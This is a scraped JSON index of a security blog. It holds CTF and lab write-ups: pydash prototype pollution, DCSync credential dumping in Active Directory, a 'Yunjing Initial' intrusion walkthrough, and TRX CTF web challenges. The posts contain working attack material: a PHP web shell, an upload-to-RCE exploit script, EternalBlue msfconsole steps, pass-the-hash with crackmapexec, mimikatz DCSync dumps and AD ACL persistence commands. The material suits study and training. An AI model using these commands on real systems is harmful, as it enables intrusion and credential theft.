2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"WEB","type":"tags"},{"content":"首发于奇安信攻防论坛：https://forum.butian.net/share/4251\n前言 #\rNCTF遇到了一道pydash题目，似乎与SUCTF2025出的一道SU_blog都是这个知识点，遂想基于这道题分析一下链子。其实还可以结合idekctf那道题\nNCTF-Pydash #\r我们首先来贴一下题目给的源码然后下载一下Pydash的源码\n\u0026#39;\u0026#39;\u0026#39; Hints: Flag在环境变量中 \u0026#39;\u0026#39;\u0026#39; from typing import Optional import pydash import bottle __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;,\u0026#34;render\u0026#34; ] __forbidden_name__=[ \u0026#34;bottle\u0026#34; ] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False for word in __forbidden_name__: if name==word: return False for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False obj=globals()[name] try: pydash.set_(obj,path,value) except: return False return True @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): name = bottle.request.query.get(\u0026#39;name\u0026#39;) path=bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path,str): return \u0026#34;no\u0026#34; if len(name)\u0026gt;6 or len(path)\u0026gt;32: return \u0026#34;no\u0026#34; value=bottle.request.json.get(\u0026#39;value\u0026#39;) return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): path=bottle.request.query.get(\u0026#39;path\u0026#39;) if len(path)\u0026gt;10: return \u0026#34;hacker\u0026#34; blacklist=[\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;_\u0026#34;] for c in path: if c in blacklist: return \u0026#34;hacker\u0026#34; return bottle.template(path) bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 主要看一下这里的set_\npydash.set_(obj,path,value) 我们来看一下pydash关于这一个函数是如何用的 /src/pydash/objects.py\ndef set_(obj: T, path: PathT, value: t.Any) -\u0026gt; T: \u0026#34;\u0026#34;\u0026#34; Sets the value of an object described by `path`. If any part of the object path doesn\u0026#39;t exist, it will be created. Args: obj: Object to modify. path: Target path to set value to. value: Value to set. Returns: Modified `obj`. Warning: `obj` is modified in place. Example: \u0026gt;\u0026gt;\u0026gt; set_({}, \u0026#34;a.b.c\u0026#34;, 1) {\u0026#39;a\u0026#39;: {\u0026#39;b\u0026#39;: {\u0026#39;c\u0026#39;: 1}}} \u0026gt;\u0026gt;\u0026gt; set_({}, \u0026#34;a.0.c\u0026#34;, 1) {\u0026#39;a\u0026#39;: {\u0026#39;0\u0026#39;: {\u0026#39;c\u0026#39;: 1}}} \u0026gt;\u0026gt;\u0026gt; set_([1, 2], \u0026#34;[2][0]\u0026#34;, 1) [1, 2, [1]] \u0026gt;\u0026gt;\u0026gt; set_({}, \u0026#34;a.b[0].c\u0026#34;, 1) {\u0026#39;a\u0026#39;: {\u0026#39;b\u0026#39;: [{\u0026#39;c\u0026#39;: 1}]}} .. versionadded:: 2.2.0 .. versionchanged:: 3.3.0 Added :func:`set_` as main definition and :func:`deep_set` as alias. .. versionchanged:: 4.0.0 - Modify `obj` in place. - Support creating default path values as ``list`` or ``dict`` based on whether key or index substrings are used. - Remove alias ``deep_set``. \u0026#34;\u0026#34;\u0026#34; return set_with(obj, path, value) 也就是说我们往name中传入一个对象，path中传入其属性名，values传入更改的值就可以改掉其属性的值，例如这样子\nimport pydash class Apple: def __init__(self): self.name = \u0026#34;apple\u0026#34; self.sweet = 10 a = Apple() print(f\u0026#34;修改前: {a.sweet}\u0026#34;) pydash.set_(a, \u0026#34;sweet\u0026#34;, 100) print(f\u0026#34;修改后: {a.sweet}\u0026#34;) 所以我们就要利用这个来进行污染某些参数从而读取到environ。 我们先来看看要污染什么值，首先从这个源码看不到可以读取environ的地方，所以我们应该去找一下import的库，可以看到最后面return bottle.template(path)return了一个值，利用bottle来渲染模板，遂看其源码。 我们直接搜索到对应的函数，看到这一行\nadapter = kwargs.pop(\u0026#39;template_adapter\u0026#39;, SimpleTemplate) lookup = kwargs.pop(\u0026#39;template_lookup\u0026#39;, TEMPLATE_PATH) 可以看到默认的模板引擎是SimpleTemplate，lookup就是模板的搜索路径也就是TEMPLATE_PATH这个变量 默认的TEMPLATE_PATH的值为['./','./views/']，所以会去这里面去lookup 然后接着交给SimpleTemplate去解析\nTEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings) else: TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings) 跟进这个解析器，然后因为后面传入的是name是一个path而不是一个模板，所以会走到BaseTemplate这里先寻找并解析目录下的模板文件再扔给SimpleTemplate进行渲染解析。 这里的name就是传入的bottle.template(path)的值，这里假设我们path传的是environ，然后通过abspath()方法得到TEMPLATE_PATH的绝对路径。接着进入search方法（name=environ） search方法中 最后把name拼接到lookup中的每个绝对路径中，然后读到文件后就返回这个fname，接着走到SimpleTemplate的prepare方法\nclass SimpleTemplate(BaseTemplate): def prepare(self, escape_func=html_escape, noescape=False, syntax=None, **ka): self.cache = {} enc = self.encoding self._str = lambda x: touni(x, enc) self._escape = lambda x: escape_func(touni(x, enc)) self.syntax = syntax if noescape: self._str, self._escape = self._escape, self._str 这个方法的作用就是初始化模板的字符处理逻辑，支持 HTML 转义或直接输出原始 HTML，也就是解析这个传入的template变成html 然后回到template结尾\nTEMPLATES[tplid].render(kwargs) 进入render方法 走到execute方法 构建了env执行环境，然后在env中执行预编译的模板也就是这里的self.c 如果模板调用 rebase() 继承父模板就递归渲染父模版 这个时候就会去读取environ模板文件 然后在render中返回解析后的内容 至此整个链子就分析完了，最后整理一下链子逻辑\ntemplate:adapter()-\u0026gt;class:BaseTemplate:search()-\u0026gt;class:SimpleTemplate:prepare()-\u0026gt;render()-\u0026gt;exec()-\u0026gt;stdout 所以很简单，我们只需要将模板文件改成linux的proc让他去读environ即可，利用set_方法更改掉TEMPLATE_ 其默认的值为./和./views/，我们需要读取其environ，就可以利用../../../proc/self/environ来读取，只需要我们将TEMPLATE_PATH改为../../../proc/self/然后把environ放入到其中进行渲染即可得到环境变量。 接下来去看setval函数\ndef setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False for word in __forbidden_name__: if name==word: return False for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False obj=globals()[name] try: pydash.set_(obj,path,value) except: return False return True 所以结合黑名单，playload应该是这样子的\nsetval.__globals__.bottle.TEMPLATE_PATH=[\u0026#39;../../../../../proc/self/\u0026#39;] 但是pydash是不允许去修改__globals__属性的，去看⼀下代码 在helpers.py中 所以我们要先污染这个RESTRICTED_KEYS之后再去污染bottle的值即可。 接着 最后渲染 得到flag\n","date":"25 March 2025","externalUrl":null,"permalink":"/posts/pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/","section":"Posts","summary":"\u003cp\u003e首发于奇安信攻防论坛：https://forum.butian.net/share/4251\u003c/p\u003e","title":"Pydash原型链污染链子分析","type":"posts"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/tags/dcsync/","section":"Tags","summary":"","title":"DCSync","type":"tags"},{"content":"前言 #\r这个是在打了云镜Initial的时候接触到的知识点，所以打算拿出来详细学习一下其原理，这里贴一下DRSR(Directory Replication Service)协议:https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47 因为似乎这个漏洞利用的原理就是这个协议\n在DCSync技术没有出现之前，攻击者要想拿到域内用户的hash，就只能在域控制器上运行 Mimikatz 或 Invoke-Mimikatz去抓取密码hash，但是在2015 年 8 月份， Mimkatz新增了一个主要功能叫\u0026quot;DCSync\u0026quot;，使用这项技术可以有效地 \u0026ldquo;模拟\u0026rdquo; 域控制器并从目标域控上请求域内用户密码hash。\n攻击原理 #\r主要是利用AD复制技术，在一个企业内部，为了防止DC出问题，就会布置多台域控作为AD域的备份，其作用就是同步数据更新，因为域内需要做身份验证，利用这种方法就可以快速的更新信息，这个过程就要用到前言说的Microsoft的远程目录复制服务协议也就是DRSR协议，在不同DC之间每15分钟会进行一次数据同步，而DYSync攻击就是利用这个地方进行攻击 通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求\n查找域内具有DCSync权限的用户 #\r我们可以使用powerview中的Add-DomainObjectAcl函数写入DCSync权限\n写入DCSync #\rSet-ExecutionPolicy Bypass -Scope Process import-module .\\PowerView.ps1 Add-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity haha -Rights DCSync -Verbose 通过cmd调用powershell写入\npowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity haha -Rights DCSync -Verbose}\u0026#34; 删除DCSync #\rpowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity test -Rights DCSync -Verbose}\u0026#34; powershell写入\nImport-Module .\\PowerView.ps1;\rRemove-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity test -Rights DCSync -Verbose 查询具有权限的用户 #\rpowershell查找\nImport-Module .\\Powerview.ps1\rFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match \u0026#34;DS-Replication-Get-Changes\u0026#34;}\rFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match \u0026#34;Replicating Directory Changes\u0026#34;} adfind查找 复制目录更改（DS-Replication-Get-Changes）\nAdFind.exe -s subtree -b \u0026#34;DC=test,DC=com\u0026#34; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;\u0026#34;Replicating Directory Changes\u0026#34;;; -recmute 全部复制目录更改 (DS-Replication-Get-Changes-All))\nAdFind.exe -s subtree -b \u0026#34;DC=test,DC=com\u0026#34; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;\u0026#34;Replicating Directory Changes All\u0026#34;;; -recmute 攻击 #\r如果拿到了域内用户的权限，则可以在域内直接使用mimikatz去dump域控hash，也可以利用impacket中的secretdump去dump哈希\nmimikatz\nmimikatz.exe \u0026#34;log Micropoor.txt\u0026#34; \u0026#34;lsadump::dcsync /domain:test.com /all /csv \u0026#34; \u0026#34;exit\u0026#34; secretdump\npython3 secretsdump.py test/admin:www123456#@192.168.189.128 -dc-ip 192.168.189.128\rpython3 secretsdump.py \u0026#39;test.com/admin@dc.test.com\u0026#39; -hashes :6dfad00b946adf3479fba71beeb5e4ac 场景一 #\r拿到以下用户权限可以直接写入DCSync\nAdministrators组内的用户\rdomain admins组\renterprise admins组\r域控制器的计算机帐户 看一下ACL\nImport-Module .\\Powerview.ps1\rGet-DomainObjectAcl -Identity admin -domain test.com -ResolveGUIDs 写入\npowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity admin -Rights DCSync -Verbose}\u0026#34; dump hash\nmimikatz.exe \u0026#34;log Micropoor.txt\u0026#34; \u0026#34;lsadump::dcsync /domain:test.com /all /csv\u0026#34; \u0026#34;exit\u0026#34; 场景二 #\r若当前用户具有WriteDACL权限，那么我们可以通过该权限去写入DCSync功能\n我们先在域控上给用户haha添加WriteDACL的权限\nImport-Module .\\PowerView.ps1\rAdd-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity haha -Rights WriteDacl -Verbose 写入\npowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity haha -Rights DCSync -Verbose}\u0026#34; 权限维持 #\r利用条件：\n获得以下任一用户的权限：\nDomain Admins组内的用户 Enterprise Admins组内的用户 利用原理：\n向域内的一个普通用户添加如下三条ACE(Access Control Entries)：\nDS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) 该用户即可获得利用DCSync导出域内所有用户hash的权限\n实现代码：\nhttps://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270\n利用方法：\n添加ACE的命令如下：\nAdd-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity test1 -Rights DCSync -Verbose 补充：\n删除ACE的命令：\nRemove-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity test1 -Rights DCSync -Verbose 注：\n关于更多ACL的内容可参考之前的文章：《渗透技巧——Windows下的Access Control List》\n使用域用户test1调用DCSync的方法如下：\n1.在域内一台登录了test1用户的主机上面，直接使用mimikatz的DCSync功能 #\rmimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /all /csv\u0026#34; exit 2.使用runas实现登录test1用户，再使用DCSync #\r(1)弹出cmd\necho 123456789 | runas /noprofile /user:test\\test1 cmd 弹出的cmd下执行如下命令：\nmimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /all /csv\u0026#34; exit (2)不弹框实现\necho 123456789 | runas /noprofile /user:test\\test1 c:\\test\\1.bat 1.bat的内容如下:\nc:\\test\\mimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /user:administrator /csv\u0026#34; exit\u0026gt;c:\\test\\1.txt 注：\n同类的工具还有lsrunas、lsrunase和CPAU\n3.使用powershell实现登录test1用户，再使用DCSync #\r(1)弹出cmd\n$uname=\u0026#34;test\\test1\u0026#34; $pwd=ConvertTo-SecureString \u0026#34;12345678\u0026#34; -AsPlainText –Force $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd) Start-Process -FilePath \u0026#34;cmd.exe\u0026#34; -Credential $cred 弹出的cmd下执行如下命令：\nmimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /user:administrator /csv\u0026#34; exit (2)不弹框实现\n$uname=\u0026#34;test\\test1\u0026#34; $pwd=ConvertTo-SecureString \u0026#34;12345678\u0026#34; -AsPlainText –Force $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd) Start-Process -FilePath \u0026#34;c:\\test\\1.bat\u0026#34; -Credential $cred 1.bat的内容如下:\nc:\\test\\mimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /user:administrator /csv\u0026#34; exit\u0026gt;c:\\test\\1.txt 注：\n使用wmic在本机实现登录用户test1会失败，错误如下：\nERROR:\rDescription = User credentials cannot be used for local connections 参考文章: https://tttang.com/archive/1634/#toc_1dcsync_1 https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync\n","date":"20 March 2025","externalUrl":null,"permalink":"/posts/dcsync-learning/","section":"Posts","summary":"","title":"DCSync Learning","type":"posts"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/categories/%E5%86%85%E7%BD%91/","section":"Categories","summary":"","title":"内网","type":"categories"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/initial/","section":"Tags","summary":"","title":"Initial","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/pth/","section":"Tags","summary":"","title":"PTH","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/sudo%E6%8F%90%E6%9D%83/","section":"Tags","summary":"","title":"Sudo提权","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/categories/%E4%BA%91%E9%95%9C/","section":"Categories","summary":"","title":"云镜","type":"categories"},{"content":"进来是一个登陆页面 注册不了账号指向了#，所以我们看看哪里能打 fscan扫一下发现think5.0.23然后打rce 然后尝试写一句话木马 echo '\u0026lt;?php eval($_POST[cmd]); ?\u0026gt;' \u0026gt; shell.php yj连一下 然后sudo -l看一下有什么能用的 这里再拓展一下sudo语法\nsudo [options] [command] -b：在后台执行指令； -E：继承当前环境变量； -h：显示帮助； -H：将 HOME 环境变量设为新身份的 HOME 环境变量； -k：结束密码的有效期限，也就是下次再执行 sudo 时便需要输入密码； -l：列出目前用户可执行与无法执行的指令； -p：改变询问密码的提示符号； -s\u0026lt;shell\u0026gt;：执行指定的 shell； -u\u0026lt;user\u0026gt;：以指定的用户作为新的身份。若不加上此参数，则预设以 root 作为新的身份； -v：延长密码有效期限 5 分钟； -V：显示版本信息。 发现有一个mysql，然后利用mysql提权 这里的逻辑就是，看一下我们能用的哪一个命令有sudo权限，然后利用这个权限去打高权限 关于mysql -e这个命令的解释 所以我们先读文件，找一下flag在哪里 拿下第一段 flag{60b53231- 然后接着打内网,传一个fscan上去 记得给执行权限 然后在内网的资源，所以我们需要建立一个内网隧道，这里用chisel 安装: 第一次用这个工具所以也要了解一下原理吧: 建立了一个隧道并且利用ssh加密传输保证了安全性 vps上reverse代理 然后靶机上给一个正向 最后配置一下火狐即可访问 然后这里先配一下kali的proxychains因为后续要用到 然后利用poc打后台（省略了前面弱口令部分，其实就一个base64加密爆破即可） exp.python\nimport requests session = requests.session() url_pre = \u0026#39;http://172.22.1.18/\u0026#39; url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=11\u0026#39; data1 = { \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; } r = session.post(url1, data=data1) r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r+\u0026#39;)}) filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; id = r.json()[\u0026#39;id\u0026#39;] print(id) print(filepath) url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; r = session.get(url3) r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) print(r.text) 成功写入 蚁剑连接一下（注意配一下代理） flag02:2ce3-4813-87d4-\n然后还有一台机器 这里fscan之前扫到过时ms17-101打的 这里跟着猫and狗师傅用msf吧（当一会脚本小子！）\nproxychains4 msfconsole use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp_uuid set RHOSTS 172.22.1.21 exploit 拿下 拿到hash后直接打就行\nproxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 参考链接: https://fushuling.com/index.php/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7initial/\n","date":"18 March 2025","externalUrl":null,"permalink":"/posts/initial/","section":"Posts","summary":"","title":"云镜-Initial","type":"posts"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/tags/ast/","section":"Tags","summary":"","title":"Ast","type":"tags"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/tags/shadow-dom/","section":"Tags","summary":"","title":"Shadow Dom","type":"tags"},{"content":"首发于先知社区: https://xz.aliyun.com/news/17071\nOnline Python Editor #\r进来后是一个线上的python editor，校验你输入的python语法是否正确。这里给了dockefile和一些文件，我们看看\napp.py #\rimport ast import traceback from flask import Flask, render_template, request app = Flask(__name__) @app.get(\u0026#34;/\u0026#34;) def home(): return render_template(\u0026#34;index.html\u0026#34;) @app.post(\u0026#34;/check\u0026#34;) def check(): try: ast.parse(**request.json) return {\u0026#34;status\u0026#34;: True, \u0026#34;error\u0026#34;: None} except Exception: return {\u0026#34;status\u0026#34;: False, \u0026#34;error\u0026#34;: traceback.format_exc()} if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) secret.py #\rdef main(): print(\u0026#34;Here\u0026#39;s the flag: \u0026#34;) print(FLAG) FLAG = \u0026#34;TRX{fake_flag_for_testing}\u0026#34; main() 然后在index.html中\nfunction checkCode() { var source = editor.getValue(); fetch(\u0026#39;/check\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ source: source }) }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { editor.operation(function () { editor.eachLine(function (line) { editor.removeLineClass(line, \u0026#39;background\u0026#39;, \u0026#39;highlight-line\u0026#39;); }); }); if (data.status === false \u0026amp;\u0026amp; data.error) { var errorLine = parseInt(data.error.split(\u0026#39;line \u0026#39;).pop().split(\u0026#39;,\u0026#39;)[0]) - 1; console.log(\u0026#34;Error at line:\u0026#34;, errorLine); editor.addLineClass(errorLine, \u0026#39;background\u0026#39;, \u0026#39;highlight-line\u0026#39;); } }); } 做了一个请求，所以逻辑就是，我们在网页中输入内容，然后他把我们输入后的内容发送到后端的check路由进行检查，利用ast.parse来构成语法树，如果有错误就调用traceback.format_exc()函数报错。\n我们这里先随便示例 控制台中便有报错，并且告诉你在第几行，然后在请求中会这样报错 会traceback爆出错误。 接下来我们看一下ast辅助函数 也就是说我们可以指定一个filename作为他的输入文件。 所以我们这里应该是传入一个secret.py刚好他的flag位置在第六行，我们就构造5个换行符\\n，然后加上一个:（只要令他报错就行），他就会把第六行的报错内容输出出来，刚好也是flag位置，所以就能得到flag 最后打法： 内心os：当时已经读到第一行了，但是没想到\\n能往下面读这个特性\u0026hellip;.\nBaby Sandbox #\r同样也是有附件，我们拿出来看看\nserver.js #\rconst express = require(\u0026#34;express\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const process = require(\u0026#34;process\u0026#34;); const app = express() const bot = require(\u0026#34;./bot\u0026#34;); let PORT = process.env.PORT || 1337 app.use(express.json()); app.use((req, res, next) =\u0026gt; { res.setHeader(\u0026#34;Content-Security-Policy\u0026#34;, \u0026#34;default-src \u0026#39;none\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;; form-action \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;;\u0026#34;); next() }) app.set(\u0026#34;view engine\u0026#34;, \u0026#34;ejs\u0026#34;) app.set(\u0026#34;views\u0026#34;, path.join(__dirname, \u0026#34;views\u0026#34;)) app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { let payload = req.query.payload || \u0026#39;\u0026lt;p\u0026gt;Hello World\u0026lt;/p\u0026gt;\u0026#39;; payload = payload.replace(/[^\\S ]/g, \u0026#39;\u0026#39;); res.render(\u0026#34;index\u0026#34;, { payload }); }); app.post(\u0026#34;/visit\u0026#34;, async (req, res) =\u0026gt; { let payload = req.body.payload if (!payload) return res.status(400).send(\u0026#34;Missing payload\u0026#34;) if(typeof payload !== \u0026#34;string\u0026#34;) return res.status(400).send(\u0026#34;Bad request\u0026#34;) try { let result = await bot.visit(payload) res.send(result) } catch (err) { console.error(err) res.status(500).send(\u0026#34;An error occurred\u0026#34;) } }) app.listen(PORT, () =\u0026gt; { console.log(`Server running on port ${PORT}`) }) bot.js #\r~~我服了才看见最顶上的注释\u0026hellip;~~~\n// From ASIS CTF Finals 2024 - leakbin const puppeteer = require(\u0026#34;puppeteer\u0026#34;); const PORT = process.env.PORT || 1337; const SITE = `http://localhost:${PORT}`; const FLAG = process.env.FLAG || \u0026#34;TRX{fake_flag_for_testing}\u0026#34;; const FLAG_REGEX = /^TRX{[a-z0-9_]+}$/; const sleep = async (ms) =\u0026gt; new Promise((resolve) =\u0026gt; setTimeout(resolve, ms)); const visit = (payload) =\u0026gt; { return new Promise(async (resolve, reject) =\u0026gt; { if (!FLAG_REGEX.test(FLAG)) { return reject(new Error(\u0026#34;Error: Flag does not match flag regex, contact an admin if this is on remote\u0026#34;)); } let browser, context, page; try { browser = await puppeteer.launch({ headless: true, args: [ \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;, \u0026#39;--js-flags=--noexpose_wasm,--jitless\u0026#39; // this is a web chall :) ], dumpio: true, pipe: true, executablePath: process.env.PUPPETEER_EXECUTABLE_PATH }); // incognito btw context = await browser.createBrowserContext(); page = await context.newPage(); await page.goto(SITE, { waitUntil: \u0026#34;domcontentloaded\u0026#34;, timeout: 5000 }); await page.evaluate((flag) =\u0026gt; { localStorage.setItem(\u0026#34;secret\u0026#34;, flag); }, FLAG); await page.close(); } catch (err) { console.error(err); if (browser) await browser.close(); return reject(new Error(\u0026#34;Error: Setup failed, if this happens consistently on remote contact an admin\u0026#34;)); } resolve(\u0026#34;Success!\u0026#34;); try { page = await context.newPage(); await page.goto(`${SITE}?payload=${encodeURIComponent(payload)}`, { waitUntil: \u0026#34;domcontentloaded\u0026#34;, timeout: 5000 }); await sleep(1000); } catch (err) { console.error(err); } if (browser) await browser.close(); }); }; module.exports = { visit }; 先看一下bot这边，可以看到：\nawait page.evaluate((flag) =\u0026gt; { localStorage.setItem(\u0026#34;secret\u0026#34;, flag); }, FLAG); 在local的地方存储了flag\ntry { page = await context.newPage(); await page.goto(`${SITE}?payload=${encodeURIComponent(payload)}`, { waitUntil: \u0026#34;domcontentloaded\u0026#34;, timeout: 5000 }); await sleep(1000); } catch (err) { console.error(err); } 在这里跳转到其local然后将参数传递过去。 传递到index.ejs中\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Hello\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe srcdoc=\u0026#39;\u0026lt;%= include(\u0026#34;iframe\u0026#34;, { payload: payload }) %\u0026gt;\u0026#39; sandbox=\u0026#34;allow-scripts allow-same-origin\u0026#34; \u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 然后这里用了\u0026lt;%=%\u0026gt;来渲染，其实就是把iframe嵌套进来 然后在iframe中嵌套的地方：\n\u0026lt;script\u0026gt; (function() { let container = document.getElementById(\u0026#34;secret-container\u0026#34;); let secretDiv = document.createElement(\u0026#34;div\u0026#34;); let shadow = secretDiv.attachShadow({ mode: \u0026#34;closed\u0026#34; }); let flagElement = document.createElement(\u0026#34;span\u0026#34;); flagElement.textContent = localStorage.getItem(\u0026#34;secret\u0026#34;) || \u0026#34;TRX{fake_flag_for_testing}\u0026#34;; shadow.appendChild(flagElement); localStorage.removeItem(\u0026#34;secret\u0026#34;); container.appendChild(secretDiv); })(); let d = document.createElement(\u0026#34;div\u0026#34;); d.innerHTML = 